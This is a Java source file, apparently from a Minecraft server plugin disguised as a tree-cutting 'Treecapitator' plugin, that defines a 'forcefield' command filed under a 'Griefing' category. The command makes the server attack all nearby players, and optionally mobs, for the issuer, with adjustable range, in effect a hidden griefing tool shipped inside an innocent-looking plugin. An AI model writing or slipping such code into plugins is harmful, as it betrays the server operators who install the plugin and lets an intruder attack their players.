package me.bow.treecapitatorultimate.commands.Griefing;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.*;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

@SuppressWarnings("SuspiciousMethodCalls")
public class ForceField extends Command {
    @SuppressWarnings("unchecked")
    private HashMap<UUID, forceField> players = new HashMap();
    private int tick = 0;

    public ForceField() {
        super("forcefield", "Bruh, how are you hitting me that far away?", CommandCategory.Griefing, 0);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        Object index = players.get(p.getUniqueId());
        switch (args.get(0)) {
            case "on":
                if (index == null) {
                    players.put(p.getUniqueId(), new forceField(p.getUniqueId()));
                    p.sendMessage(Start.Prefix + ChatColor.GREEN + "Successfully turned on FF!");
                } else {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "You already have FF on!");
                }
                break;
            case "off":
                if (index != null) {
                    players.remove(p.getUniqueId());
                    p.sendMessage(Start.Prefix + ChatColor.GREEN + "Successfully turned off FF!");
                } else {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "You already have FF off!");
                }
                break;
            case "hostile":
                if (index != null) {
                    forceField ff = players.get(index);
                    ff.hitHostileMobs = !ff.hitHostileMobs;
                    p.sendMessage(Start.Prefix + ChatColor.RED + "Hit hostile mobs: " + (ff.hitHostileMobs ? "On" : "Off"));
                    players.replace(p.getUniqueId(), ff);
                } else {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "You must have FF on to access this setting!");
                }
                break;
            case "friendly":
                if (index != null) {
                    forceField ff = players.get(index);
                    ff.hitFriendlyMobs = !ff.hitFriendlyMobs;
                    p.sendMessage(Start.Prefix + ChatColor.RED + "Hit friendly mobs: " + (ff.hitFriendlyMobs ? "On" : "Off"));
                    players.replace(p.getUniqueId(), ff);
                } else {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "You must have FF on to access this setting!");
                }
                break;
            case "players":
                if (index != null) {
                    forceField ff = players.get(index);
                    ff.hitPlayers = !ff.hitPlayers;
                    p.sendMessage(Start.Prefix + ChatColor.RED + "Hit players: " + (ff.hitPlayers ? "On" : "Off"));
                    players.replace(p.getUniqueId(), ff);
                } else {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "You must have FF on to access this setting!");
                }
                break;
            case "range":
                if (args.size() < 2) {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "Not enough arguments!");
                    break;
                }
                if (index != null) {
                    forceField ff = players.get(index);
                    ff.range = Double.parseDouble(args.get(1));
                    p.sendMessage(Start.Prefix + ChatColor.RED + "Range: " + ff.range);
                    players.replace(p.getUniqueId(), ff);
                } else {
                    p.sendMessage(Start.Prefix + ChatColor.RED + "You must have FF on to access this setting!");
                }
                break;
            default:
                // handle this idk
        }
    }

    private final Class packetClass = ReflectionUtils.getMinecraftClass("Packet");
    private final ReflectionUtils.ConstructorInvoker packetPlayOutAnimation = ReflectionUtils.getConstructor("{nms}.PacketPlayOutAnimation", ReflectionUtils.getClassCached("{nms}.Entity"), int.class);

    @Override
    public void onServerTick() {
        if (tick++ < 5) return;
        tick = 0;
        for (Map.Entry<UUID, forceField> fe : players.entrySet()) {
            Player p = Bukkit.getPlayer(fe.getKey());
            if (p == null || !p.isOnline()) continue;
            forceField ff = fe.getValue();
            if (p.getGameMode() == GameMode.SPECTATOR) continue;
            for (Entity ps : p.getNearbyEntities(ff.range, ff.range, ff.range))
                hitEntityCheck(p, ps, ff.hitPlayers, ff.hitHostileMobs, ff.hitFriendlyMobs);
        }
    }

    private void hitEntityCheck(Player p, Entity e, boolean damagePlayer, boolean hitHostileMobs, boolean hitFriendlyMobs) {
        if (!(e instanceof Monster || e instanceof Flying || e instanceof Ageable || e instanceof WaterMob || e instanceof HumanEntity || e instanceof Ambient))
            return;
        if (e.isDead()) return;
        if (hitFriendlyMobs && (e instanceof Ageable || e instanceof WaterMob || e instanceof Ambient)) {
            hitEntity(p, e);
        }
        if (hitHostileMobs && (e instanceof Monster || e instanceof Flying)) {
            hitEntity(p, e);
        }
        if (damagePlayer && e instanceof HumanEntity) {
            hitEntity(p, e);
        }
    }

    private void hitEntity(Player p, Entity e) {
        try {
            Object nmsPlayer = p.getClass().getMethod("getHandle").invoke(p);
            Object nmsEntity = e.getClass().getMethod("getHandle").invoke(e);
            ReflectionUtils.getMethodCached(nmsPlayer.getClass(), "attack").invoke(nmsPlayer, nmsEntity);
            Field playerConnectionField = nmsPlayer.getClass().getField("playerConnection");
            Object pConnection = playerConnectionField.get(nmsPlayer);
            Method sendPacket = pConnection.getClass().getMethod("sendPacket", packetClass);
            sendPacket.invoke(pConnection, packetPlayOutAnimation.invoke(nmsPlayer, 0));
        } catch (Exception ex) {
            Start.ErrorException(p, ex);
        }
    }

    final class forceField {
        UUID player;
        double range = 6.0d;
        boolean hitPlayers = true;
        boolean hitHostileMobs = false;
        boolean hitFriendlyMobs = false;

        forceField(UUID player) {
            this.player = player;
        }
    }
}